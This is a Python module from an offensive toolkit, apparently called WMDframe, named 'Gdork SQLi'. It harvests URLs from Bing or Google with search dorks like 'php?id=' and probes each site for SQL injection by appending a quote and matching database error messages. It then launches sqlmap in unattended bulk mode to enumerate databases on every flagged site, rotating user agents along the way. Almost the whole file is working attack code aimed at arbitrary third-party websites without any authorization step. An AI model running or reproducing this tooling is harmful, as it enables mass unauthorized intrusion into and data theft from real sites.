#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
# Module for WMDframe


import sys                          # Quit the shiat
import os                           # Working with files and starting sqlmap
import re                           # Searching web results for vuln
import requests                     # Calling websites
import urllib.parse                 # Parsing url encoding for search
import shutil                       # Checking if SQLmap is installed
import random                       # Shuffle between user agents
import time                         # Printing time when scraping and checking urls
from time import sleep              # Multiple use cases, e.g. sleep between requests
from bs4 import BeautifulSoup       # Working with website date
from core.colors import bc as bc
import core.commands as comm
import core.modules as cmodules

# Variables which needs to be defined
filenameRawUrl = "0"
filenameVulnUrl = "0"
sqlmappath = 'sqlmap'


# OPTIONS
class options():
    Author = "Thomas TJ (TTJ)"
    Name = 'Gdork SQLi'
    Call = 'gdsqli'
    Modulename = "gdorksqli"
    Version = "0.1"
    Description = "Scrape net for urls and check if they are prone to SQL injection"
    Category = 'sql'
    Type = 'sin'
    Datecreation = "03/12/2016"
    Lastmodified = "03/12/2016"
    License = "MIT"

    def __init__(self, basesearch, searchprovider, maxperpage, maxpages, startpage, timeout, savesearch, filename, verboseactive):
        self.basesearch = basesearch
        self.searchprovider = searchprovider
        self.maxperpage = maxperpage
        self.maxpages = maxpages
        self.startpage = startpage
        self.timeout = timeout
        self.savesearch = savesearch
        self.filename = filename
        self.verboseactive = verboseactive
        self.show_all()

    # Possible options
    def poss_opt(self):
        return ('basesearch', 'searchprovider', 'maxperpage', 'maxpages', 'startpage', 'timeout', 'savesearch', 'filename', 'verboseactive')

    def show_opt(self):
        print(
            ""
            + "\n\t" + bc.OKBLUE + ("%-*s %-*s %-*s %s" % (12, "OPTION", 8, "RQ", 14, "VALUE", "DESCRIPTION")) + bc.ENDC
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "------", 8, "--", 14, "-----", "-----------"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "base:", 8, "y", 14, self.basesearch, "Basesearch could be: php?id=, php?cat=, e.g."))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "searcher:", 8, "y", 14, self.searchprovider, "Bing or Google (b/g)"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "maxperpage:", 8, "y", 14, self.maxperpage, "Results per page"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "maxpages:", 8, "y", 14, self.maxpages, "Max pages to search"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "startpage:", 8, "y", 14, self.startpage, "Start page"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "timeout:", 8, "y", 14, self.timeout, "Timeout between request"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "savesearch:", 8, "y", 14, self.savesearch, "Save search results to file"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "filename:", 8, "n", 14, self.filename, "Filename base for search results"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "verbose:", 8, "n", 14, self.verboseactive, "Verbose level (0, 1, 2)"))
            + "\n"
            )

    # Show commands
    def show_commands(self):
        print(
            ""
            + "\n\t" + bc.OKBLUE + "COMMANDS:" + bc.ENDC
            + "\n\t" + "---------"
            + "\n\t" + ("%-*s ->\t%s" % (9, "run", "Run the script"))
            # + "\n\t" + ("%-*s ->\t%s" % (9, "runcom", "Run program with specific arguments"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "info", "Information"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "help", "Help"))
            # + "\n\t" + ("%-*s ->\t%s" % (9, "pd", "Predefined arguments for 'runcom'"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "so", "Show options"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "sa", "Show module info"))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'invoke', 'Invoke module'))
            + "\n\t" + ("%-*s ->\t%s" % (9, "exit", "Exit"))
            + "\n"
            )

    # Show all info
    def show_all(self):
        cmodules.showModuleData(
            options.Author,
            options.Name,
            options.Call,
            options.Category,
            options.Type,
            options.Version,
            options.Description,
            options.License,
            options.Datecreation,
            options.Lastmodified
            )
        self.show_commands()
        self.show_opt()
# END OPTIONS


def LoadUserAgents(uafile="files/user_agents.txt"):
    # uafile : string, path to text file of user agents, one per line
    uas = []
    with open(uafile, 'rb') as uaf:
        for ua in uaf.readlines():
            if ua:
                uas.append(ua.strip()[1:-1-1])
    random.shuffle(uas)
    return uas


def run():
    basesearch = sop.basesearch
    searchprovider = sop.searchprovider
    maxperpage = sop.maxperpage
    maxpages = sop.maxpages
    startpage = sop.startpage
    timeout = sop.timeout
    savesearch = sop.savesearch
    filename = 'logs/' + sop.filename
    verboseactive = sop.verboseactive

    filename_tmp = filename
    if savesearch.lower() == "y":
        filename_tmp = filename_tmp + '_rawurls.txt'
        if not os.path.isfile(filename_tmp):
            os.mknod(filename_tmp)
        else:
            appendtofile = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "fileExists - append (Y/n):" + bc.ENDC + " ")
            if appendtofile == "n":
                print(bc.WARNING + "\t[!]- User disallowed appending to resultfile")
                print(bc.WARNING + "\t[!]- Please try again with another filename")
                print(bc.WARNING + "\t[!]- Exiting")
                sys.exit()
    else:
        filename_tmp = "logs/gdorksqli_rawurls"

    # =================================
    # Make variables ready to use
    # =================================
    count = str(maxperpage)
    startpage = int(startpage)
    pages = (int(maxpages) + startpage)
    sleeptime = int(timeout)
    string = str(basesearch)
    stringurl = urllib.parse.quote_plus(string)

    print(bc.ENDC + "\n\t[*]:: Searching")
    print("\t[+]  Results")

    searchUrlForString(searchprovider, count, startpage, pages, sleeptime, string, stringurl, savesearch, filename, filename_tmp, verboseactive)


def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, string, stringurl, savesearch, filename, filename_tmp, verboseactive):
    # =================================
    # Loop through pages
    # =================================
    for start in range(startpage, pages):
        # try:
        # =========================
        # Bing search
        # =========================
        if searchprovider == "b":
            pagenr = int(start)*int(count)+1
            address = "http://www.bing.com/search?q=instreamset:(url title):" + stringurl + "&count=" + count + "&first=" + str(pagenr)
            print("\t[*]  Page number: " + str(int(start)+1))
            # Loading random useragent
            uas = LoadUserAgents()
            ua = random.choice(uas)  # select a random user agent
            headers = {"Connection": "close", "User-Agent": ua}
            r = requests.get(address, headers=headers)
            soup = BeautifulSoup(r.text, 'lxml')
            for d in soup.find_all('h2'):
                for a in d.find_all('a', href=True):
                    if string in a['href']:
                        print(
                            bc.OKGREEN
                            + "\t["
                            + time.strftime("%H:%M:%S")
                            + "]  [+]  " + a['href'] + bc.ENDC
                            )
                        if filename_tmp:
                            with open(filename_tmp, 'a') as file:
                                file.write(a['href'] + "\n")
                    elif "0.r.msn." in a['href']:
                        pass
                    else:
                        pass
            sleep(sleeptime)

        # =========================
        # Google search
        # =========================
        elif searchprovider == "g":
            pagenr = int(start)*int(count)
            address = "https://www.google.dk/search?q=" + stringurl + "&num=" + count + "&start=" + str(pagenr)
            # address = "https://www.google.dk/search?q=inurl%3A" + stringurl + "&num=" + count + "&start=" + str(pagenr)
            print("\t[*]  Page number: " + str(int(start)+1))
            # Loading random useragent
            uas = LoadUserAgents()
            ua = random.choice(uas)  # select a random user agent
            headers = {"Connection": "close", "User-Agent": ua}
            r = requests.get(address, headers=headers)
            soup = BeautifulSoup(r.text, 'lxml')
            for d in soup.find_all('cite'):
                url = d.text
                if string in url:
                    print(
                        bc.OKGREEN
                        + " \t["
                        + time.strftime("%H:%M:%S")
                        + "]  [+]  " + url + bc.ENDC
                        )
                    if filename_tmp == "y":
                        with open(filename_tmp, 'a') as file:
                            file.write(url + "\n")
            sleep(sleeptime)
        try:
            print("")

        # =============================
        # Error, end, exit
        # =============================
        # Add delete of file if savesearch n
        except KeyboardInterrupt:
            print(bc.FAIL + "  User input - Ctrl + c" + bc.ENDC)
            quitnow = input(bc.ENDC + bc.BOLD + "    Exit program (y/N): " + bc.OKBLUE)
            if quitnow == "y":
                print(bc.ENDC + "\t[!] Exiting\n\n")
                return None
            else:
                print(bc.ENDC + "\t[!] Continuing\n\n")
        except:
            print(bc.FAIL + "\t[!] ERROR!!! " + bc.ENDC)

    # =================================
    # Done - sum it up
    # =================================
    print("\n\t[+] Done scraping")
    with open(filename_tmp) as f:
        resultsnumber = sum(1 for _ in f)
    if savesearch == "y":
        print("\t[+] Scraping saved in file: " + filename_tmp)
        print("\t[+] Total saved urls:  " + str(resultsnumber))
    else:
        print("\t[+] Total urls collected:  " + str(resultsnumber))
    if resultsnumber == 0:
        print(bc.FAIL + "\t[-] No urls collected, exiting!")
        return None

    checkUrlsForVuln(filename, filename_tmp, savesearch, verboseactive)


def checkUrlsForVuln(filename, filenameRawUrl, savesearch, verboseactive):

    print("\n\n\n" + bc.HEADER)
    print("\t[*] Checking URLs for vuln")
    print("\n" + bc.ENDC)

    # Base input
    if filenameRawUrl != "0":
        urlfile = filenameRawUrl

    if not os.path.isfile(urlfile):
        print(bc.FAIL + "\t[*] URL file does not exist or no vuln urls.")
        print(bc.FAIL + "  Exiting")
        return None

    if savesearch == "y":
        if not os.path.isfile(filename):
            os.mknod(filename)
        else:
            print('\t[!]  File already exists!')
            print('\t[!]  Append to file? Press enter for yes. (y/n)')
            appendtofile = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "fileExists:" + bc.ENDC + " ")
            if appendtofile == "n":
                print("\t[!] User disallowed appending to resultfile")
                print("\t[!] Please try again with another filename")
                print("\t[!] Exiting\n\n")
                return None
    else:
        filename = "0"

    print(bc.ENDC + "\n\t[*]::Reading file\n")
    print("\t[*]  Connecting\n")

    # =================================
    # Loop through urls and add a qoute
    # =================================

    with open(urlfile) as fileorg:
        for line in fileorg:
            checkMY1 = 0
            checkMY2 = 0
            checkMY3 = 0
            checkMY4 = 0
            checkMS1 = 0
            checkMS2 = 0
            checkMS3 = 0
            checkOR1 = 0
            checkOR2 = 0
            checkOR3 = 0
            checkPO1 = 0
            checkPO2 = 0
            try:
                # Get data
                url = line + "'"
                print(
                    "\t["
                    + time.strftime("%H:%M:%S")
                    + "]  [*]  " + line.strip('\n')
                    )
                # Loading random useragent
                uas = LoadUserAgents()
                ua = random.choice(uas)  # select a random user agent
                headers = {"Connection": "close", "User-Agent": ua}
                r = requests.get(url, headers=headers)
                soup = BeautifulSoup(r.text, 'lxml')

                # Check if vuln - might updated indicationstrings according to
                # MySQL
                checkMY1 = len(soup.find_all(text=re.compile('check the manual that corresponds to your MySQL')))
                checkMY2 = len(soup.find_all(text=re.compile('SQL syntax')))
                checkMY3 = len(soup.find_all(text=re.compile('server version for the right syntax')))
                checkMY4 = len(soup.find_all(text=re.compile('expects parameter 1 to be')))
                # Microsoft SQL server
                checkMS1 = len(soup.find_all(text=re.compile('Unclosed quotation mark before the character string')))
                checkMS2 = len(soup.find_all(text=re.compile('An unhanded exception occurred during the execution')))
                checkMS3 = len(soup.find_all(text=re.compile('Please review the stack trace for more information')))
                # Oracle Errors
                checkOR1 = len(soup.find_all(text=re.compile('java.sql.SQLException: ORA-00933')))
                checkOR2 = len(soup.find_all(text=re.compile('SQLExceptionjava.sql.SQLException')))
                checkOR3 = len(soup.find_all(text=re.compile('quoted string not properly terminated')))
                # Postgre SQL
                checkPO1 = len(soup.find_all(text=re.compile('Query failed:')))
                checkPO2 = len(soup.find_all(text=re.compile('unterminated quoted string at or near')))

                # Verbose level 1
                if verboseactive == "1":
                    print("\t[V]  Check1 MySQL found:    " + str(checkMY1))
                    print("\t[V]  Check2 MySQL found:    " + str(checkMY2))
                    print("\t[V]  Check3 MySQL found:    " + str(checkMY3))
                    print("\t[V]  Check4 MySQL found:    " + str(checkMY4))
                    print("\t[V]  Check5 MS SQL found:   " + str(checkMS1))
                    print("\t[V]  Check6 MS SQL found:   " + str(checkMS2))
                    print("\t[V]  Check7 MS SQL found:   " + str(checkMS3))
                    print("\t[V]  Check8 Oracle found:   " + str(checkOR1))
                    print("\t[V]  Check9 Oracle found:   " + str(checkOR2))
                    print("\t[V]  Check10 Oracle found:  " + str(checkOR3))
                    print("\t[V]  Check11 Postgre found: " + str(checkPO1))
                    print("\t[V]  Check12 Postgre found: " + str(checkPO2))

                # Verbose level 2
                if verboseactive == "2":
                    checkverMY1 = soup.find(text=re.compile('check the manual that corresponds to your MySQL'))
                    checkverMY2 = soup.find(text=re.compile(r'SQL syntax'))
                    checkverMY3 = soup.find(text=re.compile(r'server version for the right syntax'))
                    checkverMY4 = soup.find(text=re.compile('expects parameter 1 to be'))
                    print("\t[V]  Check1 MySQL found:    " + str(checkverMY1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("\t[V]  Check2 MySQL found:    " + str(checkverMY2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("\t[V]  Check3 MySQL found:    " + str(checkverMY3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("\t[V]  Check4 MySQL found:    " + str(checkverMY4).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))

                    checkverMS1 = soup.find(text=re.compile('Unclosed quotation mark before the character string'))
                    checkverMS2 = soup.find(text=re.compile('An unhanded exception occurred during the execution'))
                    checkverMS3 = soup.find(text=re.compile('Please review the stack trace for more information'))
                    print("\t[V]  Check5 MS SQL found:   " + str(checkverMS1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("\t[V]  Check6 MS SQL found:   " + str(checkverMS2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("\t[V]  Check7 MS SQL found:   " + str(checkverMS3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))

                    checkverOR1 = soup.find(text=re.compile('java.sql.SQLException: ORA-00933'))
                    checkverOR2 = soup.find(text=re.compile('SQLExceptionjava.sql.SQLException'))
                    checkverOR3 = soup.find(text=re.compile('quoted string not properly terminated'))
                    print("\t[V]  Check8 Oracle found:   " + str(checkverOR1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("\t[V]  Check9 Oracle found:   " + str(checkverOR2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("\t[V]  Check10 Oracle found:  " + str(checkverOR3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))

                    checkverPO1 = soup.find(text=re.compile('Query failed:'))
                    checkverPO2 = soup.find(text=re.compile('unterminated quoted string at or near'))
                    print("\t[V]  Check11 Postgre found: " + str(checkverPO1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("\t[V]  Check12 Postgre found: " + str(checkverPO2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))

                # If X is vuln
                if (checkMY1 > 0 or checkMY2 > 0 or checkMY3 > 0 or checkMY4 > 0 or checkMS1 > 0 or checkMS2 > 0 or checkMS3 > 0 or checkOR1 > 0 or checkOR2 > 0 or checkOR3 > 0 or checkPO1 > 0 or checkPO2):
                    print(
                        bc.OKGREEN
                        + "\n"
                        + "                   Possible vuln url!"
                        + "\n"
                        + "\t["
                        + time.strftime("%H:%M:%S")
                        + "]  [+]  "
                        + line + bc.ENDC
                        + "\n"
                        )
                    if savesearch == "y":
                        with open(filename, 'a') as file:
                            file.write(line)
                else:
                    print(
                        bc.WARNING
                        + "\t["
                        + time.strftime("%H:%M:%S")
                        + "]  [-]  " + line + bc.ENDC
                        )

            # Skip X or/and exit
            except KeyboardInterrupt:
                print(bc.FAIL + "\t[X]  " + line + bc.ENDC)
                print('\t[!] Quit? Press enter for continue, or n for quit (y/n)')
                quitnow = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "quit:" + bc.ENDC + " ")
                if quitnow == "y":
                    print(bc.ENDC + "\t[!] Exiting\n\n")
                    return None
                else:
                    print(bc.ENDC + "\t[!] Continuing\n\n")

            # Bad X
            except:
                print(bc.FAIL + "\t[X]  " + line + bc.ENDC)

    # =================================
    # Done - sum it up
    # =================================
    print("\n\t[+] Done scanning urls")
    if savesearch == "y":
        with open(filename) as f:
            resultsnumber = sum(1 for _ in f)
        print("\t[+] Scraping saved in file: " + filename)
        print("\t[+] Total saved urls:  " + str(resultsnumber))
        if resultsnumber == 0:
            print("\t[+] No vuln urls, exiting\n\n")
            return None
    print('\t[!]  Run vuln urls through SQLmap (y/n)?')
    checkurls = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "runSQLmap:" + bc.ENDC + " ")
    if checkurls == "y":
        scanUrlsSQLmap(filename)
    else:
        print(bc.ENDC + "\t[!] Exiting\n\n")
        return None


def scanUrlsSQLmap(filenameVulnUrl):
    print("\n\n\n" + bc.HEADER)
    print("\t[*] Starting SQLmap")
    print("\n" + bc.ENDC)

    # =================================
    # Check if sqlmap installed, file, etc.
    # =================================

    if shutil.which('sqlmap') is None:
        print("\t[!] SQLmap is not installed on system - can't go on.")
        print("\t[!] Install sqlmap and run command below (sudo pacman -S sqlmap, sudo apt-get install sqlmap, etc.)")
        print("\n\t[!] Command:")
        print("\t[*] sqlmap -m \"" + filenameVulnUrl + "\n")
    else:
        if filenameVulnUrl == "0":
            print("\t[!] No filename in memory, please specify.")
            return None

    print(bc.ENDC + "\t[*] SQLmap will be started with arguments dbs, batch, random-agent, 4xthreads.")

    fileDestination = (os.getcwd() + "/" + filenameVulnUrl)
    command = ('sqlmap -m ' + fileDestination + " --dbs --batch --random-agent --threads 4")
    print("\t[*] Command to execute: " + command)
    print(bc.BOLD + "\t[*] Press Ctrl + c to exit\n\n\n")

    # RUN SQLMAP !!
    os.system(command)

    # Not implemented - specify saving destination
    # @type  savingplace: str
    # @param savingplace: Who should perform the search.
    # savingplace = input(bc.ENDC + "  Specify folder where results will be placed: " + bc.OKBLUE)
    # if savingplace not in ('b', 'g'):
    #    print(bc.WARNING + "  - Wrong input - only 'b' and 'g' allowed. Using 'b'")
    #    savingplace = 'b'


def justCheckUrls():
    print("  Filepath from run is still in memory: " + filenameRawUrl)
    urlfileChoose = input(bc.ENDC + "  (i)nput new filename, or (u)se from memory (i/U): " + bc.OKBLUE)
    if urlfileChoose not in ('i', 'u'):
        print(bc.WARNING + "  - Using from memory")
        urlfileChoose = 'u'
    if urlfileChoose == 'u':
        pass


def info():
    print("\n\n" + bc.HEADER)
    print("  .---.  .---.     .-''-.    .---.     .-------.         ,---.    ,---.    .-''-.   ")
    print("  |   |  |_ _|   .'_ _   \   | ,_|     \  _(`)_ \        |    \  /    |  .'_ _   \  ")
    print("  |   |  ( ' )  / ( ` )   ',-./  )     | (_ o._)|        |  ,  \/  ,  | / ( ` )   ' ")
    print("  |   '-(_{;}_). (_ o _)  |\  '_ '`)   |  (_,_) /        |  |\_   /|  |. (_ o _)  | ")
    print("  |      (_,_) |  (_,_)___| > (_)  )   |   '-.-'         |  _( )_/ |  ||  (_,_)___| ")
    print("  | _ _--.   | '  \   .---.(  .  .-'   |   |             | (_ o _) |  |'  \   .---. ")
    print("  |( ' ) |   |  \  `-'    / `-'`-'|___ |   |             |  (_,_)  |  | \  `-'    / ")
    print("  (_{;}_)|   |   \       /   |        \/   )             |  |      |  |  \       /  ")
    print("  '(_,_) '---'    `'-..-'    `--------``---'             '--'      '--'   `'-..-'   ")
    print("\n\n" + bc.ENDC)
    print("  This python script is developed to show, how many vulnerables websites,")
    print("  which are laying around on the web. The main focus of the script is to")
    print("  generate a list of vuln urls. Please use the script with causing and")
    print("  alert the webadmins of vulnerable pages. The SQLmap implementation is")
    print("  just for showcasing.")
    print("")
    print("  The script is divided into 3 main sections.\n")
    print(bc.BOLD + "  # Section 1" + bc.ENDC)
    print("    In this section you have to provide a search string, which 'connects' to")
    print("    the websites database, e.g. 'php?id='. The script then crawls")
    print("    Bing or Google for urls containing it. All of the urls can then be saved")
    print("    into a file. (Please be aware that you might get banned for crawling to")
    print("    fast, remember an appropriate break/sleep between request).")
    print(bc.ITALIC + "    Example of searchs: php?bookid=, php?idproduct=, php?bookid=, php?catid=,")
    print("                        php?action=, php?cart_id=, php?title=, php?itemid=" + bc.ENDC)
    print("")
    print(bc.BOLD + "  # Section 2" + bc.ENDC)
    print("    This section adds a qoute ' to the websites url. If the website is")
    print("    prone to SQL injection, we'll catch this with some predefined error")
    print("    messages. The script will not add websites for blind SQL injections,")
    print("    due to the predefined error messages.")
    print("")
    print(bc.BOLD + "  # Section 3" + bc.ENDC)
    print("    This is just an activation of sqlmap with the bulk argument and no")
    print("    user interaction for validation of SQL injection.")
    print("")
    print("\n")
    print(bc.BOLD + "      Stay safe and help the vulnerables" + bc.ENDC)
    print("\n")
    sys.exit()


# CONSOLE
def console():
    valueQ = input("  " + bc.FAIL + "mdw" + bc.ENDC + "@" + bc.FAIL + "gdsqli:" + bc.ENDC + " ")
    userinput = valueQ.split()
    if 'so' in userinput[:1]:
        sop.show_opt()
    elif 'sa' in userinput[:1]:
        sop.show_all()
    elif 'help' in userinput[:1]:
        print('\n\n###########################################################')
        print('#  SQLmap')
        print('###########################################################\n')
        os.system(sqlmappath + ' --help')
        print('\n\n###########################################################\n\n')
    elif 'info' in userinput[:1]:
        info()
    elif 'run' in userinput[:1]:
        run()
    elif 'set' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')
        uservalue = str(userinput[2:3]).strip('[]\'')
        if useroption not in sop.poss_opt():
            print(bc.WARN + "\n    Error, no options for: " + useroption + "\n" + bc.ENDC)
        elif useroption in sop.poss_opt():
            setattr(sop, useroption, uservalue)
            print('\n      ' + useroption + '\t> ' + uservalue + "\n")
    elif 'invoke' in userinput[:1]:
        comm.invokeModule(options.Call)
        return None
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    else:
        print(bc.WARNING + "\n    error\t> " + str(userinput[:1]) + "\n" + bc.ENDC)
    # Always return to console:
    console()
# END console


def main():
    print("\n\n")
    print("      _____           __   _____ ____    __       _         _           __  _           ")
    print("     / __(_)___  ____/ /  / ___// __ \  / /      (_)___    (_)__  _____/ /_(_)___  ____ ")
    print("    / /_/ / __ \/ __  /   \__ \/ / / / / /      / / __ \  / / _ \/ ___/ __/ / __ \/ __ |")
    print("   / __/ / / / / /_/ /   ___/ / /_/ / / /___   / / / / / / /  __/ /__/ /_/ / /_/ / / / /")
    print("  /_/ /_/_/ /_/\__,_/   /____/\___\_\/_____/  /_/_/ /_/_/ /\___/\___/\__/_/\____/_/ /_/ ")
    print("                                                     /___/                              ")
    print('\n')
    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    comm.checkInstalledOpt(sqlmappath)
    comm.checkNetConnectionV()
    print('')
    global sop
    sop = options('php?id=', 'b', '25', '10', '1', '5', 'y', 'gdorksqli', '0')
    console()
